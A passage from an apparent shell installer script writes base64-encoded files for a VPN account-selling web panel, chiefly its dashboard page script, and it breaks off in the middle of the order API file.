aXY+CiAgPC9kaXY+CjwvZGl2PgoKPHNjcmlwdD4KbGV0IGN1cnJlbnRQcm90byA9ICd2bWVzcyc7CmxldCBjdXJyZW50RGF5cyA9IDc7CmxldCBjdXJyZW50VHJpYWxQcm90byA9ICd2bWVzcyc7CmxldCBkZWxldGVBa3VuSWQgPSBudWxsOwpsZXQgZGVsZXRlQWt1blR5cGUgPSBudWxsOwpjb25zdCBwYWdlcyA9IFsnaG9tZScsJ29yZGVyJywnYWt1bicsJ3RvcHVwJywnc2VydmVyJywncml3YXlhdCcsJ3NldHRpbmcnXTsKY29uc3QgcGFnZVRpdGxlcyA9IHtob21lOidEYXNoYm9hcmQnLG9yZGVyOidPcmRlciBWUE4nLGFrdW46J0FrdW4gVlBOJyx0b3B1cDonSXNpIFNhbGRvJyxzZXJ2ZXI6J1N0YXR1cyBTZXJ2ZXInLHJpd2F5YXQ6J1Jpd2F5YXQnLHNldHRpbmc6J1NldHRpbmcgQWt1bid9OwoKZnVuY3Rpb24gc2hvd1BhZ2UocCkgewogIHBhZ2VzLmZvckVhY2gobiA9PiBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgncGFnZS0nK24pLnN0eWxlLmRpc3BsYXkgPSBuPT09cD8nJzonbm9uZScpOwogIGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdwYWdlVGl0bGUnKS50ZXh0Q29udGVudCA9IHBhZ2VUaXRsZXNbcF18fHA7CiAgZG9jdW1lbnQucXVlcnlTZWxlY3RvckFsbCgnLm5hdi1pdGVtJykuZm9yRWFjaChlbCA9PiBlbC5jbGFzc0xpc3QucmVtb3ZlKCdhY3RpdmUnKSk7CiAgZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ3BhZ2VBbGVydCcpLmlubmVySFRNTCA9ICcnOwogIGlmKHdpbmRvdy5pbm5lcldpZHRoPD03NjgpIGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdzaWRlYmFyJykuY2xhc3NMaXN0LnJlbW92ZSgnb3BlbicpOwogIHVwZGF0ZUhhcmdhKCk7Cn0KCmZ1bmN0aW9uIHNlbGVjdFByb3RvKGJ0bikgewogIGRvY3VtZW50LnF1ZXJ5U2VsZWN0b3JBbGwoJyNwYWdlLW9yZGVyIC5wcm90by1idG5bZGF0YS1wcm90b10nKS5mb3JFYWNoKGI9PmIuY2xhc3NMaXN0LnJlbW92ZSgnYWN0aXZlJykpOwogIGJ0bi5jbGFzc0xpc3QuYWRkKCdhY3RpdmUnKTsgY3VycmVudFByb3RvPWJ0bi5kYXRhc2V0LnByb3RvOwp9CmZ1bmN0aW9uIHNlbGVjdFRyaWFsUHJvdG8oYnRuKSB7CiAgZG9jdW1lbnQucXVlcnlTZWxlY3RvckFsbCgnI21vZGFsVHJpYWwgLnByb3RvLWJ0bltkYXRhLXByb3RvXScpLmZvckVhY2goYj0+Yi5jbGFzc0xpc3QucmVtb3ZlKCdhY3RpdmUnKSk7CiAgYnRuLmNsYXNzTGlzdC5hZGQoJ2FjdGl2ZScpOyBjdXJyZW50VHJpYWxQcm90bz1idG4uZGF0YXNldC5wcm90bzsKfQpmdW5jdGlvbiBzZWxlY3REdXJhdGlvbihidG4pIHsKICBkb2N1bWVudC5xdWVyeVNlbGVjdG9yQWxsKCcucHJvdG8tYnRuW2RhdGEtZGF5c10nKS5mb3JFYWNoKGI9PmIuY2xhc3NMaXN0LnJlbW92ZSgnYWN0aXZlJykpOwogIGJ0bi5jbGFzc0xpc3QuYWRkKCdhY3RpdmUnKTsgY3VycmVudERheXM9cGFyc2VJbnQoYnRuLmRhdGFzZXQuZGF5cyk7IHVwZGF0ZUhhcmdhKCk7Cn0KZnVuY3Rpb24gdXBkYXRlSGFyZ2EoKSB7CiAgY29uc3Qgc2VsPWRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdvcmRlclNlcnZlcicpOwogIGlmKCFzZWwpIHJldHVybjsKICBjb25zdCBvcHQ9c2VsLm9wdGlvbnNbc2VsLnNlbGVjdGVkSW5kZXhdOwogIGlmKCFvcHQpIHJldHVybjsKICBjb25zdCBoUGQ9cGFyc2VGbG9hdChvcHQuZGF0YXNldC5oYXJnYUhhcml8fDApLCBoUG09cGFyc2VGbG9hdChvcHQuZGF0YXNldC5oYXJnYUJ1bGFufHwwKTsKICBsZXQgaCA9IGN1cnJlbnREYXlzID49IDMwID8gKGhQbSAqIE1hdGguZmxvb3IoY3VycmVudERheXMvMzApKSArIChoUGQgKiAoY3VycmVudERheXMlMzApKSA6IGhQZCAqIGN1cnJlbnREYXlzOwogIGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdoYXJnYVZhbCcpLnRleHRDb250ZW50PSdScCAnK25ldyBJbnRsLk51bWJlckZvcm1hdCgnaWQtSUQnKS5mb3JtYXQoaCk7Cn0KZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ29yZGVyU2VydmVyJyk/LmFkZEV2ZW50TGlzdGVuZXIoJ2NoYW5nZScsIHVwZGF0ZUhhcmdhKTsKdXBkYXRlSGFyZ2EoKTsKCmZ1bmN0aW9uIHNlbGVjdE1ldGhvZChidG4pIHsKICBkb2N1bWVudC5xdWVyeVNlbGVjdG9yQWxsKCcubWV0aG9kLWJ0bicpLmZvckVhY2goYj0+Yi5jbGFzc0xpc3QucmVtb3ZlKCdhY3RpdmUnKSk7CiAgYnRuLmNsYXNzTGlzdC5hZGQoJ2FjdGl2ZScpOwogIGNvbnN0IG09YnRuLmRhdGFzZXQubWV0aG9kOwogIFsnYmFua0luZm8nLCdkYW5hSW5mbycsJ2dvcGF5SW5mbycsJ3Nob3BlZUluZm8nLCdxcmlzSW5mbyddLmZvckVhY2goaWQ9PmRvY3VtZW50LmdldEVsZW1lbnRCeUlkKGlkKS5zdHlsZS5kaXNwbGF5PSdub25lJyk7CiAgY29uc3QgbWFwPXttYW51YWxfdHJhbnNmZXI6J2JhbmtJbmZvJyxkYW5hOidkYW5hSW5mbycsZ29wYXk6J2dvcGF5SW5mbycsc2hvcGVwYXk6J3Nob3BlZUluZm8nLHFyaXM6J3FyaXNJbmZvJ307CiAgaWYobWFwW21dKSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZChtYXBbbV0pLnN0eWxlLmRpc3BsYXk9Jyc7Cn0KCmZ1bmN0aW9uIHNob3dNb2RhbChpZCl7ZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoaWQpLmNsYXNzTGlzdC5hZGQoJ3Nob3cnKX0KZnVuY3Rpb24gY2xvc2VNb2RhbChpZCl7ZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoaWQpLmNsYXNzTGlzdC5yZW1vdmUoJ3Nob3cnKX0KZnVuY3Rpb24gc2hvd1RyaWFsTW9kYWwoKXtzaG93TW9kYWwoJ21vZGFsVHJpYWwnKTtkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgndHJpYWxSZXN1bHQnKS5jbGFzc0xpc3QucmVtb3ZlKCdzaG93Jyl9CgpmdW5jdGlvbiBkb09yZGVyKCkgewogIGNvbnN0IHVzZXJuYW1lPWRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdvcmRlclVzZXJuYW1lJykudmFsdWUudHJpbSgpOwogIGNvbnN0IHNlcnZlcklkPWRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdvcmRlclNlcnZlcicpLnZhbHVlOwogIGlmKCF1c2VybmFtZSl7c2hvd0FsZXJ0KCdwYWdlQWxlcnQnLCdVc2VybmFtZSB3YWppYiBkaWlzaSEnLCdlcnJvcicpO3JldHVybjt9CiAgY29uc3QgYnRuPWRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdvcmRlckJ0blR4dCcpOwogIGJ0bi5pbm5lckhUTUw9JzxzcGFuIGNsYXNzPSJsb2FkaW5nIj48L3NwYW4+IE1lbXByb3Nlcy4uLic7CiAgY29uc3QgZmQ9bmV3IEZvcm1EYXRhKCk7CiAgZmQuYXBwZW5kKCdzZXJ2ZXJfaWQnLHNlcnZlcklkKTsgZmQuYXBwZW5kKCd0aXBlJyxjdXJyZW50UHJvdG8pOwogIGZkLmFwcGVuZCgndXNlcm5hbWUnLHVzZXJuYW1lKTsgZmQuYXBwZW5kKCdkYXlzJyxjdXJyZW50RGF5cyk7CiAgZmV0Y2goJy9vcmRlcnZwbi9hcGkvY3JlYXRlX29yZGVyLnBocCcse21ldGhvZDonUE9TVCcsYm9keTpmZH0pCiAgLnRoZW4ocj0+ci5qc29uKCkpLnRoZW4ocmVzPT57CiAgICBidG4uaW5uZXJIVE1MPSfwn5uSIE9yZGVyIFNla2FyYW5nJzsKICAgIGNvbnN0IGJveD1kb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnb3JkZXJSZXN1bHQnKTsKICAgIGJveC5jbGFzc0xpc3QuYWRkKCdzaG93Jyk7CiAgICBpZihyZXMuc3VjY2Vzcyl7CiAgICAgIGJveC5pbm5lckhUTUw9YnVpbGRSZXN1bHRIVE1MKHJlcyk7CiAgICAgIHNob3dBbGVydCgncGFnZUFsZXJ0Jywn4pyFIEFrdW4gYmVyaGFzaWwgZGlidWF0IScsJ3N1Y2Nlc3MnKTsKICAgICAgc2V0VGltZW91dCgoKT0+e3Nob3dQYWdlKCdha3VuJyk7bG9jYXRpb24ucmVsb2FkKCk7fSw0MDAwKTsKICAgIH0gZWxzZSB7CiAgICAgIGJveC5pbm5lckhUTUw9JzxkaXYgY2xhc3M9ImFsZXJ0IGFsZXJ0LWVycm9yIj7inYwgJytlc2NIdG1sKHJlcy5tZXNzYWdlKSsnPC9kaXY+JzsKICAgIH0KICB9KS5jYXRjaCgoKT0+e2J0bi5pbm5lckhUTUw9J/Cfm5IgT3JkZXIgU2VrYXJhbmcnO30pOwp9CgpmdW5jdGlvbiBkb1RyaWFsKCkgewogIGNvbnN0IHVzZXJuYW1lPWRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCd0cmlhbFVzZXJuYW1lJykudmFsdWUudHJpbSgpOwogIGNvbnN0IHNlcnZlcklkPWRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCd0cmlhbFNlcnZlcicpLnZhbHVlOwogIGlmKCF1c2VybmFtZSl7cmV0dXJuO30KICBjb25zdCBmZD1uZXcgRm9ybURhdGEoKTsKICBmZC5hcHBlbmQoJ3NlcnZlcl9pZCcsc2VydmVySWQpOyBmZC5hcHBlbmQoJ3RpcGUnLGN1cnJlbnRUcmlhbFByb3RvKTsKICBmZC5hcHBlbmQoJ3VzZXJuYW1lJyx1c2VybmFtZSk7IGZkLmFwcGVuZCgnZGF5cycsMSk7IGZkLmFwcGVuZCgnaXNfdHJpYWwnLDEpOwogIGZldGNoKCcvb3JkZXJ2cG4vYXBpL2NyZWF0ZV9vcmRlci5waHAnLHttZXRob2Q6J1BPU1QnLGJvZHk6ZmR9KQogIC50aGVuKHI9PnIuanNvbigpKS50aGVuKHJlcz0+ewogICAgY29uc3QgYm94PWRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCd0cmlhbFJlc3VsdCcpOwogICAgYm94LmNsYXNzTGlzdC5hZGQoJ3Nob3cnKTsKICAgIGlmKHJlcy5zdWNjZXNzKXtib3guaW5uZXJIVE1MPWJ1aWxkUmVzdWx0SFRNTChyZXMpO30KICAgIGVsc2V7Ym94LmlubmVySFRNTD0nPGRpdiBjbGFzcz0iYWxlcnQgYWxlcnQtZXJyb3IiPuKdjCAnK2VzY0h0bWwocmVzLm1lc3NhZ2UpKyc8L2Rpdj4nO30KICB9KTsKfQoKZnVuY3Rpb24gYnVpbGRSZXN1bHRIVE1MKHJlcykgewogIGxldCBodG1sPSc8ZGl2IHN0eWxlPSJtYXJnaW4tYm90dG9tOi43NXJlbSI+PGRpdiBjbGFzcz0iYWxlcnQgYWxlcnQtc3VjY2VzcyI+4pyFIEFrdW4gYmVyaGFzaWwgZGlidWF0ITwvZGl2PjwvZGl2Pic7CiAgaHRtbCs9YDxkaXYgY2xhc3M9InJlc3VsdC1yb3ciPjxzcGFuIGNsYXNzPSJyZXN1bHQta2V5Ij5Vc2VybmFtZTwvc3Bhbj48c3BhbiBjbGFzcz0icmVzdWx0LXZhbCI+JHtlc2NIdG1sKHJlcy51c2VybmFtZXx8JycpfTwvc3Bhbj48L2Rpdj5gOwogIGlmKHJlcy51dWlkKSBodG1sKz1gPGRpdiBjbGFzcz0icmVzdWx0LXJvdyI+PHNwYW4gY2xhc3M9InJlc3VsdC1rZXkiPlVVSUQ8L3NwYW4+PHNwYW4gY2xhc3M9InJlc3VsdC12YWwiIHN0eWxlPSJmb250LWZhbWlseTptb25vc3BhY2U7Zm9udC1zaXplOi43cmVtIj4ke2VzY0h0bWwocmVzLnV1aWQpfTwvc3Bhbj48L2Rpdj5gOwogIGlmKHJlcy5wYXNzd29yZCkgaHRtbCs9YDxkaXYgY2xhc3M9InJlc3VsdC1yb3ciPjxzcGFuIGNsYXNzPSJyZXN1bHQta2V5Ij5QYXNzd29yZDwvc3Bhbj48c3BhbiBjbGFzcz0icmVzdWx0LXZhbCI+JHtlc2NIdG1sKHJlcy5wYXNzd29yZCl9PC9zcGFuPjwvZGl2PmA7CiAgaHRtbCs9YDxkaXYgY2xhc3M9InJlc3VsdC1yb3ciPjxzcGFuIGNsYXNzPSJyZXN1bHQta2V5Ij5FeHBpcmVkPC9zcGFuPjxzcGFuIGNsYXNzPSJyZXN1bHQtdmFsIj4ke2VzY0h0bWwocmVzLmV4cGlyZWR8fCcnKX08L3NwYW4+PC9kaXY+YDsKICBpZihyZXMubGlua190bHMpe2h0bWwrPSc8cCBzdHlsZT0iZm9udC1zaXplOi43NXJlbTtjb2xvcjp2YXIoLS1tdXRlZCk7bWFyZ2luOi41cmVtIDAgLjI1cmVtIj5MaW5rIFRMUzo8L3A+PGRpdiBjbGFzcz0ibGluay1ib3giIG9uY2xpY2s9ImNvcHlUZXh0KFwnJytlc2NIdG1sKHJlcy5saW5rX3RscykrJ1wnLHRoaXMpIj4nK2VzY0h0bWwocmVzLmxpbmtfdGxzLnN1YnN0cmluZygwLDgwKSkrJy4uLjwvZGl2PjxwIGNsYXNzPSJjb3B5LWhpbnQiPlRhcCB1bnR1ayBzYWxpbjwvcD4nO30KICBpZihyZXMubGlua19ub250bHMpe2h0bWwrPSc8cCBzdHlsZT0iZm9udC1zaXplOi43NXJlbTtjb2xvcjp2YXIoLS1tdXRlZCk7bWFyZ2luOi41cmVtIDAgLjI1cmVtIj5MaW5rIE5vblRMUzo8L3A+PGRpdiBjbGFzcz0ibGluay1ib3giIG9uY2xpY2s9ImNvcHlUZXh0KFwnJytlc2NIdG1sKHJlcy5saW5rX25vbnRscykrJ1wnLHRoaXMpIj4nK2VzY0h0bWwocmVzLmxpbmtfbm9udGxzLnN1YnN0cmluZygwLDgwKSkrJy4uLjwvZGl2Pic7fQogIGlmKHJlcy5saW5rX2dycGMpe2h0bWwrPSc8cCBzdHlsZT0iZm9udC1zaXplOi43NXJlbTtjb2xvcjp2YXIoLS1tdXRlZCk7bWFyZ2luOi41cmVtIDAgLjI1cmVtIj5MaW5rIGdSUEM6PC9wPjxkaXYgY2xhc3M9ImxpbmstYm94IiBvbmNsaWNrPSJjb3B5VGV4dChcJycrZXNjSHRtbChyZXMubGlua19ncnBjKSsnXCcsdGhpcykiPicrZXNjSHRtbChyZXMubGlua19ncnBjLnN1YnN0cmluZygwLDgwKSkrJy4uLjwvZGl2Pic7fQogIGlmKHJlcy5kb3dubG9hZCl7aHRtbCs9YDxicj48YSBocmVmPSIke2VzY0h0bWwocmVzLmRvd25sb2FkKX0iIHRhcmdldD0iX2JsYW5rIiBjbGFzcz0iYnRuIGJ0bi1vdXRsaW5lIGJ0bi1zbSI+4qyH77iPIERvd25sb2FkIENvbmZpZzwvYT5gO30KICByZXR1cm4gaHRtbDsKfQoKZnVuY3Rpb24gc2hvd0FrdW5EZXRhaWwoYSkgewogIGxldCBodG1sPScnOwogIGh0bWwrPWA8ZGl2IGNsYXNzPSJyZXN1bHQtcm93Ij48c3BhbiBjbGFzcz0icmVzdWx0LWtleSI+VXNlcm5hbWU8L3NwYW4+PHNwYW4gY2xhc3M9InJlc3VsdC12YWwiPiR7ZXNjSHRtbChhLnVzZXJuYW1lKX08L3NwYW4+PC9kaXY+YDsKICBodG1sKz1gPGRpdiBjbGFzcz0icmVzdWx0LXJvdyI+PHNwYW4gY2xhc3M9InJlc3VsdC1rZXkiPlRpcGU8L3NwYW4+PHNwYW4gY2xhc3M9InJlc3VsdC12YWwiPiR7ZXNjSHRtbChhLnRpcGUpLnRvVXBwZXJDYXNlKCl9JHthLmlzX3RyaWFsPycgIPCfjoEgVHJpYWwnOicnfTwvc3Bhbj48L2Rpdj5gOwogIGlmKGEudXVpZCkgaHRtbCs9YDxkaXYgY2xhc3M9InJlc3VsdC1yb3ciPjxzcGFuIGNsYXNzPSJyZXN1bHQta2V5Ij5VVUlEPC9zcGFuPjxzcGFuIGNsYXNzPSJyZXN1bHQtdmFsIiBzdHlsZT0iZm9udC1mYW1pbHk6bW9ub3NwYWNlO2ZvbnQtc2l6ZTouN3JlbSI+JHtlc2NIdG1sKGEudXVpZCl9PC9zcGFuPjwvZGl2PmA7CiAgaWYoYS5wYXNzd29yZF92cG4pIGh0bWwrPWA8ZGl2IGNsYXNzPSJyZXN1bHQtcm93Ij48c3BhbiBjbGFzcz0icmVzdWx0LWtleSI+UGFzc3dvcmQ8L3NwYW4+PHNwYW4gY2xhc3M9InJlc3VsdC12YWwiPiR7ZXNjSHRtbChhLnBhc3N3b3JkX3Zwbil9PC9zcGFuPjwvZGl2PmA7CiAgaHRtbCs9YDxkaXYgY2xhc3M9InJlc3VsdC1yb3ciPjxzcGFuIGNsYXNzPSJyZXN1bHQta2V5Ij5TZXJ2ZXI8L3NwYW4+PHNwYW4gY2xhc3M9InJlc3VsdC12YWwiPiR7ZXNjSHRtbChhLm5hbWFfc2VydmVyfHwnJyl9PC9zcGFuPjwvZGl2PmA7CiAgaHRtbCs9YDxkaXYgY2xhc3M9InJlc3VsdC1yb3ciPjxzcGFuIGNsYXNzPSJyZXN1bHQta2V5Ij5FeHBpcmVkPC9zcGFuPjxzcGFuIGNsYXNzPSJyZXN1bHQtdmFsIj4ke2VzY0h0bWwoYS5tYXNhX2FrdGlmfHwnJyl9PC9zcGFuPjwvZGl2PmA7CiAgaWYoYS5saW5rX3Rscyl7aHRtbCs9JzxwIHN0eWxlPSJmb250LXNpemU6Ljc1cmVtO2NvbG9yOnZhcigtLW11dGVkKTttYXJnaW46Ljc1cmVtIDAgLjI1cmVtIj5MaW5rIFRMUzo8L3A+PGRpdiBjbGFzcz0ibGluay1ib3giIG9uY2xpY2s9ImNvcHlUZXh0KFwnJytlbmNvZGVVUklDb21wb25lbnQoYS5saW5rX3RscykrJ1wnLHRoaXMpIj4nK2VzY0h0bWwoYS5saW5rX3Rscy5zdWJzdHJpbmcoMCw4MCkpKycuLi48L2Rpdj48cCBjbGFzcz0iY29weS1oaW50Ij5UYXAgdW50dWsgc2FsaW48L3A+Jzt9CiAgaWYoYS5saW5rX25vbnRscyl7aHRtbCs9JzxwIHN0eWxlPSJmb250LXNpemU6Ljc1cmVtO2NvbG9yOnZhcigtLW11dGVkKTttYXJnaW46LjVyZW0gMCAuMjVyZW0iPkxpbmsgTm9uVExTOjwvcD48ZGl2IGNsYXNzPSJsaW5rLWJveCIgb25jbGljaz0iY29weVRleHQoXCcnK2VuY29kZVVSSUNvbXBvbmVudChhLmxpbmtfbm9udGxzKSsnXCcsdGhpcykiPicrZXNjSHRtbChhLmxpbmtfbm9udGxzLnN1YnN0cmluZygwLDgwKSkrJy4uLjwvZGl2Pic7fQogIGlmKGEubGlua19ncnBjKXtodG1sKz0nPHAgc3R5bGU9ImZvbnQtc2l6ZTouNzVyZW07Y29sb3I6dmFyKC0tbXV0ZWQpO21hcmdpbjouNXJlbSAwIC4yNXJlbSI+TGluayBnUlBDOjwvcD48ZGl2IGNsYXNzPSJsaW5rLWJveCIgb25jbGljaz0iY29weVRleHQoXCcnK2VuY29kZVVSSUNvbXBvbmVudChhLmxpbmtfZ3JwYykrJ1wnLHRoaXMpIj4nK2VzY0h0bWwoYS5saW5rX2dycGMuc3Vic3RyaW5nKDAsODApKSsnLi4uPC9kaXY+Jzt9CiAgZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2FrdW5EZXRhaWxDb250ZW50JykuaW5uZXJIVE1MPWh0bWw7CiAgc2hvd01vZGFsKCdtb2RhbEFrdW4nKTsKfQoKZnVuY3Rpb24gY29uZmlybURlbGV0ZShpZCxuYW1lLHR5cGUpe2RlbGV0ZUFrdW5JZD1pZDtkZWxldGVBa3VuVHlwZT10eXBlO2RvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdkZWxldGVVc2VybmFtZScpLnRleHRDb250ZW50PW5hbWU7c2hvd01vZGFsKCdtb2RhbERlbGV0ZScpO30KZnVuY3Rpb24gZG9EZWxldGUoKXsKICBpZighZGVsZXRlQWt1bklkKSByZXR1cm47CiAgZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2RlbGV0ZUJ0bicpLmlubmVySFRNTD0nPHNwYW4gY2xhc3M9ImxvYWRpbmciPjwvc3Bhbj4nOwogIGZldGNoKCcvb3JkZXJ2cG4vYXBpL2RlbGV0ZV9hY2NvdW50LnBocCcse21ldGhvZDonUE9TVCcsaGVhZGVyczp7J0NvbnRlbnQtVHlwZSc6J2FwcGxpY2F0aW9uL3gtd3d3LWZvcm0tdXJsZW5jb2RlZCd9LGJvZHk6J2FrdW5faWQ9JytkZWxldGVBa3VuSWR9KQogIC50aGVuKHI9PnIuanNvbigpKS50aGVuKHJlcz0+ewogICAgY2xvc2VNb2RhbCgnbW9kYWxEZWxldGUnKTsKICAgIGlmKHJlcy5zdWNjZXNzKXtzaG93QWxlcnQoJ3BhZ2VBbGVydCcsJ+KchSBBa3VuIGJlcmhhc2lsIGRpaGFwdXMgZGFyaSBzZXJ2ZXIhJywnc3VjY2VzcycpO3NldFRpbWVvdXQoKCk9PmxvY2F0aW9uLnJlbG9hZCgpLDE1MDApO30KICAgIGVsc2V7c2hvd0FsZXJ0KCdwYWdlQWxlcnQnLCfinYwgJytlc2NIdG1sKHJlcy5tZXNzYWdlKSwnZXJyb3InKTt9CiAgfSkuY2F0Y2goKCk9PntjbG9zZU1vZGFsKCdtb2RhbERlbGV0ZScpO30pOwp9CgpmdW5jdGlvbiBkb1RvcHVwKCl7CiAgY29uc3QgYW1vdW50PWRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCd0b3B1cEFtb3VudCcpLnZhbHVlOwogIGNvbnN0IG1ldGhvZD1kb2N1bWVudC5xdWVyeVNlbGVjdG9yKCcubWV0aG9kLWJ0bi5hY3RpdmUnKT8uZGF0YXNldC5tZXRob2R8fCdtYW51YWxfdHJhbnNmZXInOwogIGlmKCFhbW91bnR8fGFtb3VudDw1MDAwKXtkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgndG9wdXBSZXN1bHQnKS5pbm5lckhUTUw9JzxkaXYgY2xhc3M9ImFsZXJ0IGFsZXJ0LWVycm9yIj5Ob21pbmFsIG1pbmltYWwgUnAgNS4wMDA8L2Rpdj4nO3JldHVybjt9CiAgY29uc3QgZmQ9bmV3IEZvcm1EYXRhKCk7CiAgZmQuYXBwZW5kKCdhbW91bnQnLGFtb3VudCk7IGZkLmFwcGVuZCgncGF5bWVudF9tZXRob2QnLG1ldGhvZCk7CiAgY29uc3QgZmlsZT1kb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnYnVrdGlGaWxlJykuZmlsZXNbMF07CiAgaWYoZmlsZSkgZmQuYXBwZW5kKCdidWt0aScsZmlsZSk7CiAgZmV0Y2goJy9vcmRlcnZwbi9hcGkvdG9wdXAucGhwJyx7bWV0aG9kOidQT1NUJyxib2R5OmZkfSkKICAudGhlbihyPT5yLmpzb24oKSkudGhlbihyZXM9PnsKICAgIGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCd0b3B1cFJlc3VsdCcpLmlubmVySFRNTD1yZXMuc3VjY2VzcwogICAgICA/JzxkaXYgY2xhc3M9ImFsZXJ0IGFsZXJ0LXN1Y2Nlc3MiPuKchSAnK2VzY0h0bWwocmVzLm1lc3NhZ2UpKyc8L2Rpdj4nCiAgICAgIDonPGRpdiBjbGFzcz0iYWxlcnQgYWxlcnQtZXJyb3IiPuKdjCAnK2VzY0h0bWwocmVzLm1lc3NhZ2UpKyc8L2Rpdj4nOwogIH0pOwp9CgpmdW5jdGlvbiBzYXZlUHJvZmlsZSgpewogIGNvbnN0IGVtYWlsPWRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdzZXR0aW5nRW1haWwnKS52YWx1ZTsKICBjb25zdCB3YT1kb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnc2V0dGluZ1dhJykudmFsdWU7CiAgY29uc3QgcGFzcz1kb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnc2V0dGluZ1Bhc3MnKS52YWx1ZTsKICBjb25zdCBwYXNzQz1kb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnc2V0dGluZ1Bhc3NDb25maXJtJykudmFsdWU7CiAgaWYocGFzcyAmJiBwYXNzIT09cGFzc0Mpe3Nob3dBbGVydCgnc2V0dGluZ0FsZXJ0JywnUGFzc3dvcmQgdGlkYWsgY29jb2shJywnZXJyb3InKTtyZXR1cm47fQogIGNvbnN0IGZkPW5ldyBGb3JtRGF0YSgpOwogIGZkLmFwcGVuZCgnZW1haWwnLGVtYWlsKTsgZmQuYXBwZW5kKCd3aGF0c2FwcCcsd2EpOwogIGlmKHBhc3MpIGZkLmFwcGVuZCgncGFzc3dvcmQnLHBhc3MpOwogIGZldGNoKCcvb3JkZXJ2cG4vYXBpL3VwZGF0ZV9wcm9maWxlLnBocCcse21ldGhvZDonUE9TVCcsYm9keTpmZH0pCiAgLnRoZW4ocj0+ci5qc29uKCkpLnRoZW4ocmVzPT57CiAgICBzaG93QWxlcnQoJ3NldHRpbmdBbGVydCcscmVzLnN1Y2Nlc3M/J+KchSBQcm9maWwgYmVyaGFzaWwgZGlzaW1wYW4hJzon4p2MICcrZXNjSHRtbChyZXMubWVzc2FnZSkscmVzLnN1Y2Nlc3M/J3N1Y2Nlc3MnOidlcnJvcicpOwogIH0pOwp9CgpmdW5jdGlvbiBzaG93QWxlcnQoY29udGFpbmVySWQsbXNnLHR5cGUpewogIGNvbnN0IGVsPWRvY3VtZW50LmdldEVsZW1lbnRCeUlkKGNvbnRhaW5lcklkKTsKICBpZihlbCl7ZWwuaW5uZXJIVE1MPWA8ZGl2IGNsYXNzPSJhbGVydCBhbGVydC0ke3R5cGV9Ij4ke21zZ308L2Rpdj5gO3NldFRpbWVvdXQoKCk9PntlbC5pbm5lckhUTUw9Jyd9LDUwMDApO30KfQpmdW5jdGlvbiBjb3B5VGV4dCh0ZXh0LGVsKXsKICBjb25zdCBkZWNvZGVkPWRlY29kZVVSSUNvbXBvbmVudCh0ZXh0KTsKICBuYXZpZ2F0b3IuY2xpcGJvYXJkPy53cml0ZVRleHQoZGVjb2RlZCkudGhlbigoKT0+ewogICAgY29uc3Qgb3JpZz1lbC5pbm5lckhUTUw7IGVsLmlubmVySFRNTD0n4pyFIFRlcnNhbGluISc7IHNldFRpbWVvdXQoKCk9PntlbC5pbm5lckhUTUw9b3JpZ30sMTUwMCk7CiAgfSkuY2F0Y2goKCk9Pnt9KTsKfQpmdW5jdGlvbiBlc2NIdG1sKHMpe3JldHVybiBTdHJpbmcoc3x8JycpLnJlcGxhY2UoLyYvZywnJmFtcDsnKS5yZXBsYWNlKC88L2csJyZsdDsnKS5yZXBsYWNlKC8+L2csJyZndDsnKS5yZXBsYWNlKC8iL2csJyZxdW90OycpO30KPC9zY3JpcHQ+CjwvYm9keT4KPC9odG1sPgo=" | base64 -d > "$DIR"/dashboard.php
    # api/create_order.php
    echo "PD9waHAKcmVxdWlyZV9vbmNlIF9fRElSX18uJy8uLi9pbmNsdWRlcy9jb25maWcucGhwJzsKcmVxdWlyZV9vbmNlIF9fRElSX18uJy8uLi9pbmNsdWRlcy92cG5fbWFuYWdlci5waHAnOwokc2Vzc2lvbiA9IHJlcXVpcmVMb2dpbigpOwpoZWFkZXIoJ0NvbnRlbnQtVHlwZTogYXBwbGljYXRpb24vanNvbicpOwoKJHVzZXJJZCAgID0gJHNlc3Npb25bJ3VzZXJfaWQnXTsKJHNlcnZlcklkID0gKGludCkoJF9QT1NUWydzZXJ2ZXJfaWQnXSA/PyAwKTsKJHRpcGUgICAgID0gc3RydG9sb3dlcihzYW5pdGl6ZSgkX1BPU1RbJ3RpcGUnXSA/PyAnJykpOwokdXNlcm5hbWUgPSBwcmVnX3JlcGxhY2UoJy9bXmEtekEtWjAtOV9cLV0vJywgJycsICRfUE9TVFsndXNlcm5hbWUnXSA/PyAnJyk7CiRkYXlzICAgICA9IChpbnQpKCRfUE9TVFsnZGF5cyddID8/IDApOwokaXNUcmlhbCAgPSBpc3NldCgkX1BPU1RbJ2lzX3RyaWFsJ10pICYmICRfUE9TVFsnaXNfdHJpYWwnXSA9PSAxOwoKaWYgKCEkc2VydmVySWQgfHwgISR0aXBlIHx8ICEkdXNlcm5hbWUgfHwgJGRheXMgPCAxKSB7CiAgICBlY2hvIGpzb25fZW5jb2RlKFsnc3VjY2Vzcyc9PmZhbHNlLCdtZXNzYWdlJz0+J1BhcmFtZXRlciB0aWRhayBsZW5na2FwJ10pOyBleGl0Owp9CmlmICghaW5fYXJyYXkoJHRpcGUsIFsnc3NoJywndm1lc3MnLCd2bGVzcycsJ3Ryb2phbiddKSkgewogICAgZWN